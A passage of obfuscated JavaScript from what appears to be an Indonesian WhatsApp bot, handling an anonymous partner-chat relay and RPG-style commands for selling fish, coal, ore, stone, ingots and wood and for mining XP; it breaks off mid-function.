_0x420cec=['*Jumlah\x20In','et-fu/prox','nggu...\x202\x20','cffc2.jpg','prGQT','NHBYS','CHhxO','er\x0a\x0aSumber','n\x20lebih\x20ba','tu\x20dijual:','aktifkan','\x20meninggal','Kamu\x20MENAN','\x20:\x20','XpogC','Sedang\x20ber','floor','c4c0e.jpg','ation\x20🎊*','.next','Maaf\x20','tunggu...','fillTextPa','\x20Anonymous','\x0a🗃️\x20*USER\x20I','L\x20」*','*Sisa\x20Batu','ia\x20dari\x20*','leave','casino','tain','Ore\x20dilebu','\x20ingot\x20kam','skip\x20-\x20Ski','\x20kayu','EoNdr','4097740MgIvqw','\x20Chat\x0a\x0a','text.com/n','mrBSH','mDEeG','sSOcc','\x20Mountains','k\x20mengecek','itemukan_\x20','LEAVE','hasil\x20deng','NqemC','xPAPT','*Uang\x20dida','\x202\x20menit,\x20','upi\x20untuk\x20','L*\x20:\x20','\x20ORE*\x20:\x20','Xp*','\x20Woods\x0a🟠\x20L','d07dd22294','uang\x20untuk','sender','iOyHv','jelajah','FGwoA','*Sisa\x20ikan','\x20batu','*\x20kayu','6uzJutA','Cek\x20invent','Welcome\x20To','merkurius','embayaran\x20','\x0a🌐\x20*WOOD*\x20','ancing,\x20si','ame\x20untuk\x20','Only\x20priva','RESPONSE','4be9865c0f','START','Keluar','contextInf','get','1114684RQpKKe','*Sisa\x20uang','Meltw','displayTex','\x0a\x0aSilahkan','u\x20Partner_','vnnku','includes','📛\x20_Partner','venus','k\x20Dapat\x20Di','ceil','*Congratul','ave\x20Partne','tkan\x20_','\x20ore\x20kamu\x20','ub\x20belum\x20d','MHeRg','™©\x20|\x20By\x20','isArray','ma\x202\x20menit','lahkan\x20tun','ggu...','\x202021','*Jumlah\x20Ba','f95c31af10','wfTtO','map','Menunggu\x20h','i\x20event\x20gr','mendapatka','Stop','pdMjA','\x0a🛑\x20*STONE*','random','al\x202\x20ingot','sisabahank','\x0a\x0a*_','other','\x20Chat,\x20Kli','yKRAq','9a30f.jpg','My\x20Invento','neptunus','*「\x20LEBUR\x20B','ile/0c3fa8','MENU','cript=sket','check','maaf\x20','\x20Chat\x20!','1194403dcnEdn','\x20silahkan\x20','rBMmi','tasynamege','tualang,\x20s','920kal','\x20ketik\x20','yNlLt','Dpbcv','n\x20oleh\x20own','ens\x20River\x0a','imia','ilangan\x20ua','etlgM','YaMaU','MFjUE','Error\x20','nboIZ','got\x20dijual','k\x20Dibawah\x20','didcK','ino\x20sebesa','jwzMz','*\x20ikan','jualkayu','://www.fan','ijual:*\x20','eHeight=50','oxQPI','rassland','jualbahank','tmmxF','legra.ph/f','*\x20Ikan\x20sel','nda','*PILIH\x20WIL','exec','ajWxe','🏃\x20_Berhasi','limingstal','qFNnw','_\x20adalah:*','jIDpZ','an\x20nomer\x20p','bil\x20Woods\x0a','LyyCg','\x20🥺\x20dan\x20keh','ERHASIL\x20」*','\x20limit','Mau\x20taruha','https://ww','r\x20:*\x20','ation\x20🎊*\x0a\x0a','\x20tahun','state','silahkan\x20t','engan\x20cara','goplanet','zrkXw','=100&fillT','Penjualan\x20','l\x20mountain','ari\x20Sesi\x20A','p\x20Partner\x0a','Xp\x20untuk\x20a','values','skip','nayoL','ile/44fc68','Ydumn','arch\x20Partn','corbiens\x20r','re\x20dan\x20','am\x20bot\x20men','kamu\x20menda','6f57a4f6d9','nerators.c','xample\x20:\x0a-','iens\x20Grass','nonymous\x20C','is\x20silahka','svHzd','.start','l\x20Keluar\x20D','*Jumlah\x20ba','hwIbB','\x20sudah\x20hab','l\x202\x20kayu','n\x20kirim\x20','745245GeTLnB','fromMe','limit\x20untu','PaZQw','Kamu\x20KALAH','*「\x20PENJUAL','test','belum\x20cuku','lebur','hankimia\x20d','cyLdo','NaKnz','\x0a\x0a*Jumlah\x20','girim\x20','i\x20aktifkan','h=800&scal','AZTgs','unggu...','al\x202\x20stone','anonymous','.leave','ing\x20tidak\x20','l\x202\x20ikan','buttonId','Sedang\x20Mem','ile/00018d','\x0a🐬\x20*FISH*\x20','©\x20Copyrigh','7479320NsNKBP','k\x20punya\x20ba','apatkan\x20*','ucuBc','e:*\x20','petualang,','al\x20dijual:','nyak\x20inven','pat:*\x20','ile/168577','next','mars','4NZOuiw','Kamu\x20kalah','mancing','sUpVa','ory\x20anda\x20d','*\x20copper\x20o','ZbKka','karena\x20and','t\x20Anonymou','chade\x20moun','&scaleWidt','ile/efdcd7','jualingot','euCZw','IuYEE','asil!.','ile/77c3ba','tahun','nebang','🟢\x20Chiltawa','*\x20batu\x20,\x20*','slice','ch-name&do','RmtmL','\x20kayu\x20kamu','endsWith','gunakan\x20Un','msg','https://te','start\x20-\x20Se','ehNlZ','inv','aHuth','796392FsnLwO','07cfc44738','ilahkan\x20tu','Proses\x20ber','*Sisa\x20Kayu','judi','L\x20\x20」*','\x0a🔴\x20Chade\x20M','string','\x20Berada\x20Di','kan\x20chat_','a\x20owner\x20ka','hat_','uranus','CHATTING','adventure','d88288bak1','Sea\x0a⚫\x20Moob','om/_','BkwWe','nnWna','*Jumlah\x20Co','_Partner\x20D','ang\x20didapa','WAITING','an\x20d88288b','\x202\x20ore','PEbqY','leave\x20-\x20Le','*Sisa\x20coal','weMwx','695a8.jpg','engan\x20nomo','t\x20\x20','qLXEq','\x20belum\x20di\x20','Uang\x20mu\x20ti','a\x20bro,\x20tap',':*\x20','di\x20aktifka','gerbil\x20woo','GuOLg','s\x20Chat','ry\x20🗃️','\x20kamu\x20tida','\x0a*Ingot\x20di','Lanjut','\x20ikan\x20kamu','RZYDE','ama\x202\x20meni','kup,\x20minim','tas','VjiYT','keluar','k\x20punya\x20co','copyNForwa','type','byTVx','Kamu\x20Masih','G!!','extType=1&','method','quoted','u\x20belum\x20cu','Kamu\x20Tidak','*\x20selama\x202','vmCwx','ountain\x0a\x0aE','cb5fa.jpg','96fab2ccb6','p.net','inventory','sendMessag','*bahan\x20kim','saturnus','*\x20coal\x20,\x20d','Sedang\x20men','Fitur\x20Tida','XrLOF','\x20JELAJAHI*','tory','buttonText','GFRuM','\x20kamu\x20mend','AN\x20BERHASI','jualcoal','*\x20batu\x20dan','mi\x20dari\x20te','Slkwl','38511207paOHvy','ation\x20🎊*\x20','cbqcY','bNPPS','ttern=Warn','\x202K21','lanjut','put=true&s','\x20stone\x20kam','chiltawa\x20w','Limit\x20kamu','te\x20chat','Kamu\x20menda','mulai','find','🔵\x20Cochher\x20','\x0a\x0a*Sisa\x20Or','ambang,\x20si','y_form.cgi','*Jumlah\x20Ka','join','dc9f97d658','*kayu\x20sela','VLtEf','jualikan','moobiens\x20g','SKIP','pNPZj','\x5c$&','p,\x20minimal','mining','XTLaD','up,\x20minima','Untuk\x20Star','hankimia\x20Y','.stop','*\x20ore','INGIN\x20KAMU','Anonymous\x20','0&fontsize','length','hankimia','?&imageout','start','⏳\x20_Menungg','tuk\x20Group!','@s.whatsap','text','\x20:*\x20','dak\x20mencuk','Event\x20grub','\x20bermain\x20g','NVENTORY*\x20','yNuey','patkan\x20*'];_0x112a=function(){return _0x420cec;};return _0x112a();}function _0x18e4(_0x1ed165,_0xa8f5a8){const _0x211d06=_0x112a();return _0x18e4=function(_0x1ea476,_0x1c62a6){_0x1ea476=_0x1ea476-(-0x2612+-0xbb2+-0x32da*-0x1);let _0x51b064=_0x211d06[_0x1ea476];return _0x51b064;},_0x18e4(_0x1ed165,_0xa8f5a8);}function _0x2b5443(_0x55ab2c,_0x470b23,_0x4a2b01,_0x5ca9e1){return _0x18e4(_0x470b23-0x28b,_0x5ca9e1);}const str2Regex=_0x43d6b9=>_0x43d6b9['replace'](/[|\\{}()[\]^$+*?.]/g,_0x5c83b7(0x3a9,0x387,0x35a,0x3c3)),match=(prefix instanceof RegExp?[[prefix['exec'](m[_0x2b5443(0x3f0,0x473,0x479,0x46c)]),prefix]]:Array[_0x5c83b7(0x3ad,0x479,0x3d8,0x3c4)](prefix)?prefix[_0x5c83b7(0x336,0x446,0x3e0,0x439)](_0x21bbfb=>{function _0x5ebf46(_0x1dbece,_0xdfcc86,_0x3fa74c,_0x3302d4){return _0x2b5443(_0x1dbece-0x8,_0xdfcc86- -0x1e1,_0x3fa74c-0x28,_0x3fa74c);}function _0x29d255(_0x6bbb5c,_0x10dec7,_0x910f5b,_0x26b6d1){return _0x5c83b7(_0x6bbb5c-0x125,_0x10dec7-0xeb,_0x10dec7-0x53,_0x6bbb5c);}const _0x2a4a29={'qFNnw':function(_0x7d9c5a,_0x41623a){return _0x7d9c5a instanceof _0x41623a;},'Dpbcv':function(_0x59fc8e,_0x4aeeee){return _0x59fc8e(_0x4aeeee);}};let _0xcbbea5=_0x2a4a29[_0x29d255(0x3de,0x473,0x3df,0x4e3)](_0x21bbfb,RegExp)?_0x21bbfb:new RegExp(_0x2a4a29[_0x29d255(0x3e6,0x453,0x3e6,0x4cd)](str2Regex,_0x21bbfb));return[_0xcbbea5[_0x29d255(0x4b8,0x46f,0x51f,0x3f5)](m['text']),_0xcbbea5];}):typeof prefix===_0x5c83b7(0x357,0x324,0x2ed,0x23a)?[[new RegExp(str2Regex(prefix))['exec'](m['text']),new RegExp(str2Regex(prefix))]]:[[[],new RegExp()]])[_0x5c83b7(0x2ac,0x365,0x34c,0x3be)](_0x5834ad=>_0x5834ad[0x866*0x4+-0x174*-0x18+-0x4477]);function _0x5c83b7(_0x4a1ce5,_0x39468f,_0x30cc0d,_0x52ba8d){return _0x18e4(_0x30cc0d-0x185,_0x52ba8d);}if(match&&m['chat'][_0x2b5443(0x463,0x3e3,0x49a,0x453)](_0x2b5443(0x4b1,0x472,0x3a9,0x3ec)+_0x5c83b7(0x336,0x2c9,0x32b,0x358))&&!isCmd){this[_0x5c83b7(0x326,0x274,0x2af,0x20b)]=this[_0x2b5443(0x3da,0x3b5,0x414,0x464)]?this[_0x2b5443(0x307,0x3b5,0x2ff,0x3e4)]:{};let room=Object[_0x2b5443(0x55e,0x53f,0x494,0x4a7)](this[_0x2b5443(0x39a,0x3b5,0x2f9,0x364)])[_0x2b5443(0x3d4,0x452,0x3ab,0x43d)](_0x1b4a11=>[_0x1b4a11['a'],_0x1b4a11['b']][_0x5c83b7(0x32d,0x48b,0x3cc,0x478)](m[_0x5c83b7(0x2dc,0x3ef,0x3af,0x2ec)])&&_0x1b4a11[_0x5c83b7(0x4ea,0x38d,0x42e,0x4e2)]===_0x5c83b7(0x2e7,0x31e,0x2f3,0x380));if(room){if(/^.*(next|leave|start)/[_0x2b5443(0x2f1,0x3a8,0x408,0x350)](m[_0x5c83b7(0x2c3,0x41c,0x36d,0x2c7)]))return;if([_0x2b5443(0x3b3,0x48e,0x456,0x48e),_0x2b5443(0x462,0x3b6,0x2e6,0x476),_0x5c83b7(0x323,0x2c2,0x361,0x3ed),_0x2b5443(0x5ed,0x550,0x515,0x4af),'Cari\x20Partn'+'er',_0x2b5443(0x418,0x4c8,0x458,0x499),_0x5c83b7(0x331,0x2c5,0x313,0x3e9),_0x2b5443(0x5b0,0x4ea,0x46f,0x4e3)]['includes'](m[_0x2b5443(0x52f,0x473,0x50f,0x531)]))return;let other=[room['a'],room['b']]['find'](_0x3a7eb2=>_0x3a7eb2!==m[_0x2b5443(0x556,0x4b5,0x3ef,0x557)]);m[_0x5c83b7(0x2d5,0x3a8,0x31c,0x2ab)+'rd'](other,!![],m[_0x5c83b7(0x2a4,0x376,0x323,0x396)]&&m[_0x5c83b7(0x2e2,0x304,0x323,0x368)][_0x5c83b7(0x295,0x2e2,0x29d,0x307)]?{'contextInfo':{...m[_0x5c83b7(0x269,0x255,0x2df,0x2ef)][_0x5c83b7(0x3e1,0x3e8,0x3c3,0x437)+'o'],'forwardingScore':0x0,'isForwarded':!![],'participant':other}}:{});}return!(0x1296+0x5*0x39b+-0x249d);}switch(command){case _0x5c83b7(0x2e0,0x33a,0x356,0x3ed):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5c83b7(0x2e9,0x2d5,0x348,0x3df)+'\x20sudah\x20hab'+_0x2b5443(0x562,0x54e,0x5b0,0x5fb)+_0x5c83b7(0x363,0x318,0x29b,0x256)+prefix+(_0x5c83b7(0x2ed,0x1d8,0x29e,0x353)+_0x5c83b7(0x452,0x40e,0x3a0,0x349)+_0x2b5443(0x4b0,0x52e,0x553,0x476)));if(!isEventon)return reply('Event\x20grub'+_0x5c83b7(0x25c,0x313,0x308,0x279)+_0x2b5443(0x503,0x485,0x4ea,0x3bf));bayar=args[_0x5c83b7(0x40f,0x3f8,0x352,0x38b)]('\x20');const hargaIkan=-0x2*-0x1242+-0x2b57+0x11*0x2b3,hasil1=bayar*hargaIkan;if(getMancingIkan(sender)<=0x1a3e+-0x1e43*0x1+0x406)return reply(_0x5c83b7(0x436,0x3ef,0x389,0x2b8)+pushname+(_0x2b5443(0x463,0x41a,0x3cb,0x432)+'\x20belum\x20cuk'+_0x5c83b7(0x33e,0x2d0,0x35e,0x3b0)+_0x5c83b7(0x320,0x210,0x2b2,0x33b)));getMancingIkan(sender)>=0x2101+-0x1203+-0x4ff*0x3&&(jualIkan(sender,bayar),addKoinUser(sender,hasil1),await reply(_0x5c83b7(0x323,0x21a,0x2a1,0x241)+'AN\x20BERHASI'+_0x2b5443(0x510,0x494,0x471,0x4fb)+enter+enter+('*Jumlah\x20ik'+'an\x20dijual:'+'*\x20')+bayar+enter+(_0x2b5443(0x3e2,0x4ac,0x474,0x564)+_0x2b5443(0x3c1,0x3c6,0x449,0x418))+hasil1+enter+enter+(_0x2b5443(0x582,0x4b9,0x4ec,0x4c5)+_0x2b5443(0x47b,0x411,0x3ff,0x33e))+getMancingIkan(sender)+enter+(_0x5c83b7(0x32d,0x363,0x3c6,0x32a)+_0x2b5443(0x42c,0x411,0x404,0x45b))+checkATMuser(sender)+enter+enter+('Proses\x20ber'+_0x2b5443(0x4df,0x4a9,0x516,0x40d)+_0x5c83b7(0x4f6,0x442,0x423,0x4b9)+_0x2b5443(0x50f,0x4c0,0x4e2,0x572)+_0x2b5443(0x491,0x3fb,0x46e,0x472)+_0x5c83b7(0x3df,0x489,0x3fd,0x4b7))));break;case _0x5c83b7(0x3e4,0x37c,0x33a,0x367):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x2b5443(0x3fc,0x44e,0x377,0x4ff)+_0x2b5443(0x58e,0x554,0x5c4,0x59b)+'is\x20silahka'+'n\x20kirim\x20'+prefix+('limit\x20untu'+'k\x20mengecek'+_0x2b5443(0x5c9,0x52e,0x596,0x459)));if(!isEventon)return reply(_0x2b5443(0x49c,0x476,0x516,0x3f8)+'\x20belum\x20di\x20'+_0x2b5443(0x445,0x485,0x4f0,0x444));bayar=args[_0x5c83b7(0x28a,0x2c3,0x352,0x27c)]('\x20');const hargaCoal=-0x2*0x27f7+-0x4*-0x994+0x6436,hasil2=bayar*hargaCoal;if(getMiningcoal(sender)<=0x1fea+-0x18f8+-0x6f1*0x1)return reply(_0x5c83b7(0x3e6,0x430,0x389,0x2e0)+pushname+('\x20kamu\x20tida'+_0x5c83b7(0x365,0x26d,0x31b,0x296)+'al'));getMiningcoal(sender)>=-0x1047+-0x93c+0x1984&&(jualcoal(sender,bayar),addKoinUser(sender,hasil2),await reply(_0x2b5443(0x3ee,0x3a7,0x347,0x3e1)+_0x2b5443(0x3b0,0x43f,0x379,0x3c5)+_0x5c83b7(0x3ad,0x454,0x38e,0x3b9)+enter+enter+(_0x5c83b7(0x27e,0x2d0,0x2fa,0x2cc)+_0x5c83b7(0x297,0x353,0x2be,0x2c7)+'*\x20')+bayar+enter+(_0x2b5443(0x47c,0x4ac,0x556,0x445)+_0x5c83b7(0x330,0x296,0x2c0,0x2e1))+hasil2+enter+enter+(_0x5c83b7(0x2f2,0x228,0x302,0x3b3)+_0x5c83b7(0x3cc,0x27d,0x30b,0x2c9))+getMiningcoal(sender)+enter+(_0x2b5443(0x4be,0x4cc,0x481,0x42a)+_0x2b5443(0x490,0x411,0x3c7,0x470))+checkATMuser(sender)+enter+enter+('Proses\x20ber'+_0x5c83b7(0x3b5,0x2e3,0x3a3,0x2d8)+'an\x20nomer\x20p'+'embayaran\x20'+_0x2b5443(0x3de,0x3fb,0x37f,0x354)+_0x5c83b7(0x493,0x32a,0x3fd,0x3c8))));break;case _0x2b5443(0x39e,0x3aa,0x40c,0x3d0):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5c83b7(0x2d3,0x31e,0x348,0x3f1)+_0x2b5443(0x484,0x554,0x57a,0x545)+_0x5c83b7(0x4ec,0x3bd,0x448,0x3bb)+_0x2b5443(0x468,0x3a1,0x366,0x34c)+prefix+('limit\x20untu'+_0x5c83b7(0x2f8,0x2ee,0x3a0,0x46d)+_0x2b5443(0x4fa,0x52e,0x5ca,0x508)));if(!isEventon)return reply(_0x5c83b7(0x39b,0x2d3,0x370,0x41c)+_0x5c83b7(0x2d7,0x3ce,0x308,0x39f)+_0x2b5443(0x3b2,0x485,0x47f,0x3df));bayar=args[_0x5c83b7(0x2c9,0x3d6,0x352,0x34a)]('\x20');const hargaOre=0x1c32+0xfe*-0x7+-0x1*0x153e,hasil3=bayar*hargaOre;if(getMiningore(sender)<=0x140b*0x1+0x1e8b+-0x3295)return reply('Maaf\x20'+pushname+(_0x5c83b7(0x485,0x4a5,0x3d4,0x482)+_0x5c83b7(0x256,0x228,0x2a3,0x1eb)+_0x2b5443(0x3e8,0x461,0x38b,0x423)+_0x2b5443(0x4ae,0x405,0x474,0x43f)));getMiningore(sender)>=0x1556+0xafb+-0x814*0x4&&(jualore(sender,bayar),addIngot(sender,hasil3),await reply(_0x2b5443(0x470,0x4f7,0x4e6,0x4ba)+_0x5c83b7(0x3a0,0x4fd,0x427,0x4a0)+_0x2b5443(0x328,0x3ae,0x357,0x3f8)+_0x5c83b7(0x30d,0x31f,0x394,0x361)+_0x5c83b7(0x4c4,0x35e,0x42b,0x3f8)+bayar+(_0x5c83b7(0x2df,0x2ab,0x312,0x278)+'dapat:*\x20')+hasil3+(_0x5c83b7(0x32f,0x2b9,0x34e,0x2c6)+_0x5c83b7(0x293,0x2c0,0x2bc,0x2cf))+getMiningore(sender)));break;case'jualstone':if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x2b5443(0x395,0x44e,0x40a,0x487)+'\x20sudah\x20hab'+'is\x20silahka'+'n\x20kirim\x20'+prefix+(_0x2b5443(0x403,0x3a4,0x33f,0x41e)+_0x2b5443(0x4bf,0x4a6,0x45f,0x561)+'\x20limit'));if(!isEventon)return reply(_0x2b5443(0x4c1,0x476,0x409,0x482)+_0x5c83b7(0x38e,0x37e,0x308,0x3cc)+_0x5c83b7(0x346,0x437,0x37f,0x398));bayar=args[_0x5c83b7(0x306,0x415,0x352,0x3eb)]('\x20');const hargaStone=0x2c2+-0xa73*0x1+0x97*0x13,hasil4=bayar*hargaStone;if(getMiningstone(sender)<=0x6cb+0x1980+0x2*-0x1025)return reply('Maaf\x20'+pushname+(_0x2b5443(0x3d9,0x44c,0x3ff,0x4bc)+_0x5c83b7(0x3d2,0x2cd,0x324,0x3e4)+_0x5c83b7(0x34f,0x38c,0x317,0x355)+_0x2b5443(0x397,0x3b4,0x392,0x442)));getMiningstone(sender)>=0x1f3b+-0x1f7*-0x2+-0x2328&&(jualstone(sender,bayar),addKoinUser(sender,hasil4),await reply(_0x5c83b7(0x2b6,0x294,0x2a1,0x28f)+_0x5c83b7(0x3e2,0x314,0x339,0x333)+_0x2b5443(0x40e,0x494,0x4d6,0x425)+enter+enter+(_0x5c83b7(0x3d4,0x462,0x3dd,0x3bf)+_0x2b5443(0x4ec,0x484,0x493,0x4e9)+'*\x20')+bayar+enter+(_0x5c83b7(0x362,0x39e,0x3a6,0x39f)+_0x2b5443(0x454,0x3c6,0x336,0x462))+hasil4+enter+enter+(_0x5c83b7(0x2c9,0x33d,0x38f,0x39e)+':*\x20')+getMiningstone(sender)+enter+(_0x2b5443(0x4fd,0x4cc,0x4a2,0x49e)+_0x2b5443(0x4c0,0x411,0x48d,0x393))+checkATMuser(sender)+enter+enter+(_0x5c83b7(0x39a,0x2cd,0x2e8,0x35a)+_0x2b5443(0x3f3,0x4a9,0x4b4,0x4a1)+_0x2b5443(0x5de,0x529,0x598,0x451)+_0x5c83b7(0x3ab,0x3a4,0x3ba,0x39c)+_0x5c83b7(0x314,0x34b,0x2f5,0x2d4)+_0x2b5443(0x590,0x503,0x5c5,0x506))));break;case _0x2b5443(0x376,0x3d6,0x4a5,0x439):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply('Limit\x20kamu'+_0x5c83b7(0x3cc,0x453,0x44e,0x493)+_0x2b5443(0x618,0x54e,0x5b1,0x5ff)+'n\x20kirim\x20'+prefix+('limit\x20untu'+'k\x20mengecek'+'\x20limit'));if(!isEventon)return reply(_0x5c83b7(0x312,0x357,0x370,0x32a)+_0x2b5443(0x393,0x40e,0x48a,0x35f)+_0x5c83b7(0x32a,0x2cc,0x37f,0x3ca));bayar=args[_0x5c83b7(0x3b5,0x2d8,0x352,0x2b9)]('\x20');const hargaIngot=-0x1a3d*-0x5+0x741*0x17+-0xa150,hasil5=bayar*hargaIngot;if(getMiningingot(sender)<=-0x182+-0x1f3e+0x41*0x81)return reply(_0x5c83b7(0x35e,0x2ec,0x389,0x2c5)+pushname+(_0x5c83b7(0x397,0x3c9,0x395,0x371)+'u\x20belum\x20cu'+_0x2b5443(0x476,0x41d,0x3e7,0x48f)+_0x2b5443(0x41a,0x4ee,0x548,0x539)));getMiningingot(sender)>=0x2242+0x25f0+0x1*-0x4831&&(jualingot(sender,bayar),addKoinUser(sender,hasil5),await reply(_0x5c83b7(0x2ee,0x200,0x2a1,0x2d1)+'AN\x20BERHASI'+'L\x20\x20」*'+enter+enter+(_0x5c83b7(0x3a4,0x3e8,0x375,0x3e7)+_0x5c83b7(0x4c6,0x48a,0x40a,0x42d)+_0x5c83b7(0x3cc,0x2bc,0x30b,0x2a5))+bayar+enter+(_0x2b5443(0x404,0x4ac,0x3d5,0x4d4)+_0x5c83b7(0x21e,0x1fa,0x2c0,0x28a))+hasil5+enter+enter+('*Sisa\x20Ingo'+'t:*\x20')+getMiningingot(sender)+enter+(_0x5c83b7(0x369,0x2ed,0x3c6,0x429)+_0x5c83b7(0x36b,0x27f,0x30b,0x2fa))+checkATMuser(sender)+enter+enter+('Proses\x20ber'+_0x2b5443(0x490,0x4a9,0x490,0x3ed)+_0x5c83b7(0x3c4,0x3ab,0x423,0x445)+_0x5c83b7(0x3dd,0x3b5,0x3ba,0x45a)+_0x2b5443(0x4bd,0x3fb,0x360,0x39b)+_0x5c83b7(0x3b7,0x44e,0x3fd,0x358))));break;case _0x5c83b7(0x429,0x4a1,0x410,0x3cb):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply('Limit\x20kamu'+_0x5c83b7(0x416,0x3f9,0x44e,0x401)+_0x2b5443(0x50e,0x54e,0x4ae,0x5da)+'n\x20kirim\x20'+prefix+(_0x2b5443(0x383,0x3a4,0x40a,0x35a)+_0x2b5443(0x3d2,0x4a6,0x531,0x3de)+_0x5c83b7(0x400,0x47b,0x428,0x476)));if(!isEventon)return reply(_0x2b5443(0x422,0x476,0x42b,0x4b2)+'\x20belum\x20di\x20'+_0x2b5443(0x4ae,0x485,0x3fc,0x42f));bayar=args[_0x2b5443(0x3f1,0x458,0x524,0x4e2)]('\x20');const hargaKayu=0xea9*-0x2+0xb0*-0x97+-0xcb72*-0x1,hasil6=bayar*hargaKayu;if(getNebangKayu(sender)<=-0xb2d*-0x1+-0x14da+-0x9ae*-0x1)return reply(_0x5c83b7(0x2bd,0x2ca,0x389,0x463)+pushname+(_0x2b5443(0x429,0x3e2,0x46a,0x433)+'\x20belum\x20cuk'+_0x2b5443(0x4a0,0x464,0x497,0x3c1)+_0x5c83b7(0x50b,0x4ec,0x44f,0x3dc)));getNebangKayu(sender)>=0x1f82+0x1387+-0x3308*0x1&&(jualkayu(sender,bayar),addKoinUser(sender,hasil6),await reply(_0x5c83b7(0x32a,0x37a,0x2a1,0x372)+_0x2b5443(0x4c4,0x43f,0x378,0x3ec)+_0x5c83b7(0x255,0x3ab,0x2eb,0x2c5)+enter+enter+(_0x2b5443(0x3e7,0x457,0x4bb,0x474)+'yu\x20dijual:'+'*\x20')+bayar+enter+(_0x2b5443(0x476,0x4ac,0x447,0x462)+'pat:*\x20')+hasil6+enter+enter+(_0x2b5443(0x3b8,0x3ef,0x4c9,0x46b)+_0x5c83b7(0x2db,0x35c,0x36e,0x348))+getNebangKayu(sender)+enter+('*Sisa\x20uang'+_0x5c83b7(0x389,0x2ab,0x30b,0x253))+checkATMuser(sender)+enter+enter+('Proses\x20ber'+_0x2b5443(0x52f,0x4a9,0x531,0x3ef)+_0x5c83b7(0x393,0x3fc,0x423,0x392)+'embayaran\x20'+_0x5c83b7(0x351,0x2d7,0x2f5,0x28c)+_0x2b5443(0x499,0x503,0x428,0x5bb))));break;case _0x5c83b7(0x3a7,0x3d8,0x35c,0x285):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x2b5443(0x3fe,0x44e,0x393,0x481)+_0x2b5443(0x4ee,0x554,0x5db,0x507)+'is\x20silahka'+_0x5c83b7(0x2bc,0x2e2,0x29b,0x23f)+prefix+(_0x5c83b7(0x27a,0x325,0x29e,0x1cc)+_0x2b5443(0x490,0x4a6,0x4ca,0x56f)+_0x5c83b7(0x454,0x500,0x428,0x396)));if(!isEventon)return reply('maaf\x20'+pushname+('\x20event\x20min'+_0x2b5443(0x385,0x3b7,0x39b,0x2ec)+_0x2b5443(0x41d,0x412,0x419,0x43b)+_0x5c83b7(0x434,0x419,0x401,0x380)+'er'));if(isOwner){const one=0x147ded7b+0x1*0x647a28a9+-0x3d5d4c25;addLevelingXp(sender,one),addLevelingLevel(sender,0xa2d+0xd4*-0x26+-0x1e*-0xb9),reply(_0x2b5443(0x3ef,0x3d1,0x348,0x43b)+_0x5c83b7(0x2e8,0x283,0x2f0,0x334)+_0x5c83b7(0x2db,0x408,0x33c,0x304)+_0x2b5443(0x59a,0x547,0x4fc,0x52f)+_0x5c83b7(0x36b,0x2e2,0x2a9,0x229)+one+(_0x2b5443(0x56a,0x53e,0x5ee,0x520)+_0x5c83b7(0x3bf,0x460,0x41a,0x4bc)));}else setTimeout(()=>{const _0x3a1253={'nboIZ':function(_0x318802,_0x50c6f9){return _0x318802*_0x50c6f9;},'MHeRg':function(_0x7a7e,_0x34305a){return _0x7a7e(_0x34305a);}},_0x579da8=Math[_0x20846a(0x472,0x43d,0x393,0x3ae)](_0x3a1253[_0x3f1e45(0x637,0x6e9,0x66f,0x5f5)](Math[_0x3f1e45(0x615,0x574,0x6c5,0x58d)](),0xeca+-0x29*0xa4+0x2*0x1945));function _0x3f1e45(_0x3555c5,_0x6d8068,_0x5e31f0,_0x430dfb){return _0x5c83b7(_0x3555c5-0x1c8,_0x6d8068-0x82,_0x3555c5-0x22e,_0x430dfb);}function _0x20846a(_0xcda43a,_0x535da1,_0x3a0416,_0x327a26){return _0x2b5443(_0xcda43a-0x78,_0x327a26- -0x128,_0x3a0416-0x126,_0xcda43a);}addLevelingXp(sender,_0x579da8),_0x3a1253[_0x20846a(0x480,0x3b6,0x3a4,0x3b4)](reply,_0x20846a(0x42c,0x360,0x3cf,0x3af)+_0x3f1e45(0x56d,0x518,0x4a3,0x57d)+pushname+('\x20kamu\x20mend'+_0x3f1e45(0x4e8,0x4dc,0x4c2,0x529))+_0x579da8+_0x3f1e45(0x5d9,0x638,0x5e5,0x69d));},0x2676+-0x1*0x251d+0xa5f),setTimeout(()=>{const _0x231b9e={'PEbqY':function(_0x4ed08f,_0x233823){return _0x4ed08f(_0x233823);},'JcxkE':'Sedang\x20min'+'ing\x20selama'+_0x22396b(0x165,0x1e5,0x1a1,0x203)+_0x140a05(0x52b,0x583,0x53d,0x586)+_0x140a05(0x3a7,0x401,0x465,0x3db)};function _0x140a05(_0x41ef04,_0x386db4,_0xfdf7d6,_0x5b97a0){return _0x2b5443(_0x41ef04-0xa0,_0x386db4-0x4e,_0xfdf7d6-0x1c3,_0x41ef04);}function _0x22396b(_0x2ce799,_0xc87731,_0x570869,_0x551468){return _0x5c83b7(_0x2ce799-0x83,_0xc87731-0xc2,_0x2ce799- -0x242,_0xc87731);}_0x231b9e[_0x22396b(0xbe,0x104,0x16d,0x112)](reply,_0x231b9e['JcxkE']);},0x2112+0x4*-0x10b+-0x1*0x1ce6);await limitAdd(sender,limit);break;case _0x5c83b7(0x2ff,0x2fc,0x2c6,0x26f):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x2b5443(0x445,0x44e,0x3d8,0x40d)+_0x2b5443(0x48f,0x554,0x576,0x5f8)+_0x5c83b7(0x42e,0x3ba,0x448,0x41a)+'n\x20kirim\x20'+prefix+(_0x2b5443(0x36f,0x3a4,0x343,0x33a)+_0x2b5443(0x4c5,0x4a6,0x4a0,0x52b)+_0x2b5443(0x5a6,0x52e,0x5b0,0x460)));if(!isEventon)return reply(_0x2b5443(0x3f8,0x476,0x53e,0x4ee)+_0x5c83b7(0x248,0x31c,0x308,0x234)+_0x5c83b7(0x331,0x3cc,0x37f,0x412));setTimeout(()=>{function _0x4e029f(_0x1bcfc2,_0x27b575,_0x2ddf0f,_0x518f21){return _0x2b5443(_0x1bcfc2-0x1dc,_0x27b575- -0x11b,_0x2ddf0f-0x3b,_0x1bcfc2);}function _0x301b7f(_0x43a6cc,_0xad90a3,_0x4eb2a3,_0x2a6da9){return _0x2b5443(_0x43a6cc-0x112,_0x4eb2a3- 